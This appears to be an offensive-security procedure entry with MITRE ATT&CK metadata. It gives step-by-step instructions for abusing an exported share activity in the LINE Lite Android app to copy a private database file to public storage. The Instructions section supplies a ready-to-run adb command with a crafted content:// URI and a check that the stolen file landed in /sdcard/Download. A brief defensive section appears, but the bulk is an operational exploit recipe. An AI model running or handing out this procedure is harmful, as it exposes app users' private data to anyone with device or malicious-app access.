---
tags:
  - android
  - intent-injection
  - file-copy
type: procedure
tools:
  - '[[tools/Android-Debug-Bridge-ADB]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/adb-send-intent]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:42.051Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 6be3459f-92fb-4f3d-a308-bed18a95fa1a
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger File Copy via Exported Activity

## Summary

This procedure sends a crafted intent to the exported SelectShareActivity in LINE Lite, triggering the copy of a private file to public external storage due to missing URI validation.

## Description

The activity processes the intent's URI without checks, using Android's FileProvider or similar to copy the file to a shareable location like external storage (/sdcard/). This requires user interaction, such as confirming a share dialog. Performed via ADB or a malicious app on the same device.

## Requirements

1. Crafted intent from previous procedure
2. ADB shell access or malicious app installed
3. User interaction capability (e.g., device unlocked)

## Defense

Defensive measures and detection strategies:

- Add URI validation in activity onCreate() or onReceive()
- Restrict exported activities with android:permission
- Detect via app logs or runtime monitoring tools like Frida

## Objectives

1. Invoke the exported activity with malicious intent
2. Cause unauthorized file copy
3. Confirm public accessibility

## Instructions

### Step 1: Send Intent via ADB

**Context**: Use ADB to simulate the malicious app sending the intent.

**Command** ([[commands/adb-send-intent]]):
```bash
adb shell am start -n com.linecorp.linelite/.ui.android.share.SelectShareActivity -a android.intent.action.SEND -d "content://com.linecorp.linelite.file_provider/files/private_file.db" --eu android.intent.extra.STREAM "content://com.linecorp.linelite.file_provider/files/private_file.db"
```

> This launches the activity with the crafted URI. Expected output: Activity starts, user sees share prompt; upon confirmation, file copies to public dir without errors.

### Step 2: Confirm Copy

**Context**: Verify the file has been copied.

**Instructions**: Check external storage: adb shell ls /sdcard/Download/ for the copied file.

**Expected Output**: Private file present in public directory.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/adb-send-intent]]

## Tools Used

- [[tools/Android-Debug-Bridge-ADB]]

## Tags

- [[android]]
- [[intent-injection]]
- [[file-copy]]
